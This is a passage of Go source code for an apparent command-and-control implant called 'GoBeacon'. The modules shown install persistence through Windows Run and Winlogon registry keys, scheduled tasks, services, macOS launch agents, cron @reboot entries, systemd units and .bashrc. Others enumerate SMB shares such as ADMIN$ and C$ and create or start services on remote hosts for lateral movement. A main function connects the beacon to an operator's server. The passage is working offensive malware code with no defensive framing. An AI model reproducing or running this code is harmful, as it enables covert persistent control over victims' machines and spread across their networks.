	command := strings.TrimSpace(parts[2])
	
	methods := b.getRegistryPersistenceMethods()
	if desc, exists := methods[method]; exists {
		result.WriteString(fmt.Sprintf("Using method: %s\n", desc))
		
		regPath := b.getRegistryPath(method)
		if regPath == "" {
			result.WriteString("ERROR: Invalid persistence method\n")
			return result.String()
		}
		
		regCommand := fmt.Sprintf("reg add \"%s\" /v \"%s\" /t REG_SZ /d \"%s\" /f", regPath, keyName, command)
		result.WriteString(fmt.Sprintf("Registry command: %s\n", regCommand))
		
		cmd := exec.Command("cmd", "/C", regCommand)
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("ERROR: %v\n", err))
		} else {
			result.WriteString("Registry entry created successfully\n")
			result.WriteString(string(output))
		}
	} else {
		result.WriteString(fmt.Sprintf("Unknown method: %s\n", method))
	}
	
	return result.String()
}

func (b *GoBeacon) getRegistryPersistenceMethods() map[string]string {
	return map[string]string{
		"run":        "Current user Run key (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
		"runonce":    "Current user RunOnce key",
		"runall":     "All users Run key (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
		"service":    "Windows service registry",
		"winlogon":   "Winlogon shell replacement",
		"userinit":   "Userinit replacement",
		"explorer":   "Explorer shell replacement",
	}
}

func (b *GoBeacon) getRegistryPath(method string) string {
	switch method {
	case "run":
		return "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	case "runonce":
		return "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
	case "runall":
		return "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	case "winlogon":
		return "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	case "userinit":
		return "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	case "explorer":
		return "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	}
	return ""
}

func (b *GoBeacon) moduleAutostartPersistence(parameters string) string {
	var result strings.Builder
	result.WriteString("=== AUTOSTART PERSISTENCE ===\n")
	
	parts := strings.Split(parameters, ",")
	if len(parts) < 2 {
		result.WriteString("Autostart persistence requires: method,command\n")
		result.WriteString("Available methods by platform:\n")
		methods := b.getAutostartMethods()
		for method, desc := range methods {
			result.WriteString(fmt.Sprintf("  %s: %s\n", method, desc))
		}
		return result.String()
	}
	
	method := strings.TrimSpace(parts[0])
	command := strings.TrimSpace(parts[1])
	
	methods := b.getAutostartMethods()
	if desc, exists := methods[method]; exists {
		result.WriteString(fmt.Sprintf("Using method: %s\n", desc))
		
		persistCmd := b.buildAutostartCommand(method, command)
		if persistCmd == "" {
			result.WriteString("ERROR: Method not available on this platform\n")
			return result.String()
		}
		
		result.WriteString(fmt.Sprintf("Executing: %s\n", persistCmd))
		
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", persistCmd)
		} else {
			cmd = exec.Command("sh", "-c", persistCmd)
		}
		
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("ERROR: %v\n", err))
		} else {
			result.WriteString("Persistence mechanism created successfully\n")
			result.WriteString(string(output))
		}
	} else {
		result.WriteString(fmt.Sprintf("Unknown method: %s\n", method))
	}
	
	return result.String()
}

func (b *GoBeacon) getAutostartMethods() map[string]string {
	methods := make(map[string]string)
	
	if runtime.GOOS == "windows" {
		methods["startup"] = "Windows Startup folder"
		methods["task"] = "Scheduled task"
		methods["service"] = "Windows service"
	} else if runtime.GOOS == "darwin" {
		methods["launchagent"] = "macOS Launch Agent"
		methods["launchdaemon"] = "macOS Launch Daemon"
		methods["cron"] = "Cron job"
	} else {
		methods["systemd"] = "Systemd service"
		methods["init"] = "Init script"
		methods["cron"] = "Cron job"
		methods["bashrc"] = "Bash profile"
	}
	
	return methods
}

func (b *GoBeacon) buildAutostartCommand(method, command string) string {
	switch runtime.GOOS {
	case "windows":
		switch method {
		case "startup":
			startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
			batFile := filepath.Join(startupPath, "autostart.bat")
			return fmt.Sprintf("echo %s > \"%s\"", command, batFile)
		case "task":
			return fmt.Sprintf("schtasks /create /tn \"AutoTask\" /tr \"%s\" /sc onlogon", command)
		case "service":
			return fmt.Sprintf("sc create AutoService binPath= \"%s\"", command)
		}
	case "darwin":
		switch method {
		case "launchagent":
			homeDir, _ := os.UserHomeDir()
			plistPath := filepath.Join(homeDir, "Library", "LaunchAgents", "com.autostart.agent.plist")
			return fmt.Sprintf("echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist><plist><dict><key>Label</key><string>com.autostart.agent</string><key>ProgramArguments</key><array><string>%s</string></array><key>RunAtLoad</key><true/></dict></plist>' > \"%s\"", command, plistPath)
		case "cron":
			return fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", command)
		}
	default:
		switch method {
		case "systemd":
			return fmt.Sprintf("echo '[Unit]\\nDescription=AutoStart\\n[Service]\\nExecStart=%s\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/autostart.service && systemctl enable autostart.service", command)
		case "cron":
			return fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", command)
		case "bashrc":
			homeDir, _ := os.UserHomeDir()
			return fmt.Sprintf("echo '%s' >> %s/.bashrc", command, homeDir)
		}
	}
	return ""
}


func (b *GoBeacon) moduleSMBEnumeration(parameters string) string {
	var result strings.Builder
	result.WriteString("=== SMB ENUMERATION ===\n")
	
	if parameters == "" {
		result.WriteString("SMB enumeration requires a target IP or hostname\n")
		result.WriteString("Example: 192.168.1.1 or SERVERNAME\n")
		return result.String()
	}
	
	target := strings.TrimSpace(parameters)
	result.WriteString(fmt.Sprintf("Target: %s\n", target))
	
	// SMB Share enumeration
	result.WriteString("\n--- SMB Share Enumeration ---\n")
	
	var shareCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		shareCmd = exec.Command("net", "view", fmt.Sprintf("\\\\%s", target))
	} else {
		// Try smbclient if available
		shareCmd = exec.Command("smbclient", "-L", target, "-N")
	}
	
	if shareOutput, err := shareCmd.Output(); err == nil {
		result.WriteString(string(shareOutput))
	} else {
		result.WriteString(fmt.Sprintf("Share enumeration failed: %v\n", err))
		
		// Fallback: Try to connect to common shares
		result.WriteString("\n--- Testing Common Shares ---\n")
		commonShares := []string{"C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON", "share", "public"}
		
		for _, share := range commonShares {
			shareTest := b.testSMBShare(target, share)
			result.WriteString(fmt.Sprintf("%s: %s\n", share, shareTest))
		}
	}
	
	// NetBIOS information
	result.WriteString("\n--- NetBIOS Information ---\n")
	var netbiosCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		netbiosCmd = exec.Command("nbtstat", "-A", target)
	} else {
		netbiosCmd = exec.Command("nmblookup", "-A", target)
	}
	
	if netbiosOutput, err := netbiosCmd.Output(); err == nil {
		result.WriteString(string(netbiosOutput))
	} else {
		result.WriteString(fmt.Sprintf("NetBIOS enumeration failed: %v\n", err))
	}
	
	return result.String()
}

func (b *GoBeacon) testSMBShare(target, share string) string {
	var testCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		testCmd = exec.Command("net", "use", fmt.Sprintf("\\\\%s\\%s", target, share))
	} else {
		testCmd = exec.Command("smbclient", fmt.Sprintf("//%s/%s", target, share), "-N", "-c", "ls")
	}
	
	if err := testCmd.Run(); err == nil {
		return "Accessible"
	}
	return "Access Denied"
}

func (b *GoBeacon) moduleRemoteServiceManagement(parameters string) string {
	var result strings.Builder
	result.WriteString("=== REMOTE SERVICE MANAGEMENT ===\n")
	
	parts := strings.Split(parameters, ",")
	if len(parts) < 2 {
		result.WriteString("Remote service management requires: target,action[,service_name][,binary_path]\n")
		result.WriteString("Actions: list, create, start, stop, delete\n")
		result.WriteString("Examples:\n")
		result.WriteString("  192.168.1.1,list\n")
		result.WriteString("  192.168.1.1,create,TestSvc,C:\\\\temp\\\\service.exe\n")
		result.WriteString("  192.168.1.1,start,TestSvc\n")
		return result.String()
	}
	
	target := strings.TrimSpace(parts[0])
	action := strings.TrimSpace(parts[1])
	
	result.WriteString(fmt.Sprintf("Target: %s\n", target))
	result.WriteString(fmt.Sprintf("Action: %s\n", action))
	
	switch action {
	case "list":
		result.WriteString("\n--- Listing Remote Services ---\n")
		listCmd := b.buildServiceCommand(target, "list", "", "")
		if listCmd != "" {
			cmd := exec.Command("cmd", "/C", listCmd)
			if output, err := cmd.Output(); err == nil {
				result.WriteString(string(output))
			} else {
				result.WriteString(fmt.Sprintf("Service listing failed: %v\n", err))
			}
		}
		
	case "create":
		if len(parts) < 4 {
			result.WriteString("Create requires: target,create,service_name,binary_path\n")
			return result.String()
		}
		serviceName := strings.TrimSpace(parts[2])
		binaryPath := strings.TrimSpace(parts[3])
		
		result.WriteString(fmt.Sprintf("\n--- Creating Service: %s ---\n", serviceName))
		createCmd := b.buildServiceCommand(target, "create", serviceName, binaryPath)
		if createCmd != "" {
			cmd := exec.Command("cmd", "/C", createCmd)
			if output, err := cmd.Output(); err == nil {
				result.WriteString("Service created successfully\n")
				result.WriteString(string(output))
			} else {
				result.WriteString(fmt.Sprintf("Service creation failed: %v\n", err))
			}
		}
		
	case "start", "stop", "delete":
		if len(parts) < 3 {
			result.WriteString(fmt.Sprintf("%s requires: target,%s,service_name\n", action, action))
			return result.String()
		}
		serviceName := strings.TrimSpace(parts[2])
		
		result.WriteString(fmt.Sprintf("\n--- %s Service: %s ---\n", strings.Title(action), serviceName))
		serviceCmd := b.buildServiceCommand(target, action, serviceName, "")
		if serviceCmd != "" {
			cmd := exec.Command("cmd", "/C", serviceCmd)
			if output, err := cmd.Output(); err == nil {
				result.WriteString(fmt.Sprintf("Service %s operation completed\n", action))
				result.WriteString(string(output))
			} else {
				result.WriteString(fmt.Sprintf("Service %s failed: %v\n", action, err))
			}
		}
		
	default:
		result.WriteString(fmt.Sprintf("Unknown action: %s\n", action))
	}
	
	return result.String()
}

func (b *GoBeacon) buildServiceCommand(target, action, serviceName, binaryPath string) string {
	if runtime.GOOS != "windows" {
		return "" // Service management is primarily Windows-specific
	}
	
	switch action {
	case "list":
		return fmt.Sprintf("sc \\\\%s query", target)
	case "create":
		return fmt.Sprintf("sc \\\\%s create %s binPath= \"%s\"", target, serviceName, binaryPath)
	case "start":
		return fmt.Sprintf("sc \\\\%s start %s", target, serviceName)
	case "stop":
		return fmt.Sprintf("sc \\\\%s stop %s", target, serviceName)
	case "delete":
		return fmt.Sprintf("sc \\\\%s delete %s", target, serviceName)
	}
	return ""
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go_beacon <server_ip> <server_port>")
		fmt.Println("Example: go_beacon 192.168.1.100 5074")
		os.Exit(1)
	}
	
	serverIP := os.Args[1]
	serverPort, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Invalid port number: %s\n", os.Args[2])
		os.Exit(1)
	}
	
	beacon := NewGoBeacon(serverIP, serverPort)
	beacon.Run()
}